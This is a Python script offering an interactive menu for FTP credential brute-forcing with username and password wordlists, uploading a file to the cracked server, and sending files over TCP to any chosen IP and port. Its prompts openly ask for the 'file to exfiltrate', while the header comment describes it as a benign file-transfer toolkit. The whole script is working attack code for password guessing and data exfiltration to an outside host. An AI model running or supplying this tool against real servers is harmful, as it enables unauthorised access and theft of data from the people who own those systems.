#! /usr/bin/python
#################################################################################################
# Author: Nicholas Fisher
# Date: March 6th 2024
# Description of Script:
# The provided Python script facilitates file transmission and FTP server interaction, 
# offering a versatile toolkit for network operations. The script boasts a user-friendly 
# interface where users can select various functionalities from a main menu. Notably, it 
# enables direct file transmission to a specified client IP address and port via TCP/IP. Moreover, 
# it supports FTP server interaction, allowing users to upload files to a target FTP server. 
# Additionally, the script includes a robust FTP brute-force mechanism, leveraging provided 
# username and password dictionaries to attempt login credentials systematically. This combination
# of features empowers users with flexible and efficient tools for managing file transfers 
# and interacting with FTP servers securely.
#################################################################################################
import ftplib
import os
import socket

def brute_force_ftp(username_dict, password_dict, server, port):
    """
    Function to perform brute force attack on FTP server using username and password dictionaries.
    
    Args:
        username_dict (str): Path to the username dictionary file.
        password_dict (str): Path to the password dictionary file.
        server (str): FTP server address.
        port (int): Port of the FTP server.

    Returns:
        tuple: A tuple containing the successful username and password, or (None, None) if not found.
    """
    with open(username_dict, 'r') as u_file:
        usernames = u_file.read().splitlines()

    with open(password_dict, 'r') as p_file:
        passwords = p_file.read().splitlines()

    for username in usernames:
        for password in passwords:
            try:
                ftp = ftplib.FTP()
                ftp.connect(server, port)
                ftp.login(username, password)
                print(f"FTP login successful with credentials: {username}/{password}")
                ftp.quit()
                return username, password
            except Exception as e:
                print(f"Failed login attempt: {username}/{password}")

def ftp_upload(docpath, server, port, username, password):
    """
    Function to upload a file to an FTP server.
    
    Args:
        docpath (str): Path to the file to be uploaded.
        server (str): FTP server address.
        port (int): Port of the FTP server.
        username (str): FTP server username.
        password (str): FTP server password.
    """
    ftp = ftplib.FTP()
    ftp.connect(server, port)
    ftp.login(username, password)
    ftp.cwd('/pub/')
    with open(docpath, "rb") as f:
        ftp.storbinary("STOR " + os.path.basename(docpath), f)
    ftp.quit()

def ftp_transmit(document_path, client_ip, client_port):
    """
    Function to transmit a file to a client via TCP/IP.
    
    Args:
        document_path (str): Path to the file to be transmitted.
        client_ip (str): IP address of the client.
        client_port (int): Port of the client.
    """
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        client.connect((client_ip, client_port))
        with open(document_path, 'rb') as f:
            client.sendall(f.read())
        print("File transmitted successfully.")
    except Exception as e:
        print(f"Failed to transmit file: {e}")
    finally:
        client.close()

def main_menu():
    """
    Function to display the main menu and handle user's choice.
    """
    while True:
        print("\nMain Menu:")
        print("1. Transmit file directly")
        print("2. Brute force FTP and upload file")
        print("3. Exit")
        choice = input("Please select an option: ")
        
        if choice == '1':
            file_input = input("Enter the name of the file to exfiltrate: ")
            client_ip = input("Enter the client IP address to transmit the file: ")
            client_port = int(input("Enter the client port to transmit the file: "))
            ftp_transmit(file_input, client_ip, client_port)
        elif choice == '2':
            file_input = input("Enter the name of the file to exfiltrate: ")
            server_input = input("Please enter the FTP server IPv4 address: ")
            server_port = int(input("Please enter the FTP server port: "))
            username_dict = input("Enter the path to the username dictionary: ")
            password_dict = input("Enter the path to the password dictionary: ")
            username, password = brute_force_ftp(username_dict, password_dict, server_input, server_port)
            if username and password:
                ftp_upload(file_input, server_input, server_port, username, password)
        elif choice == '3':
            print("Exiting...")
            break
        else:
            print("Invalid choice. Please select again.")

if __name__ == '__main__':
    main_menu()
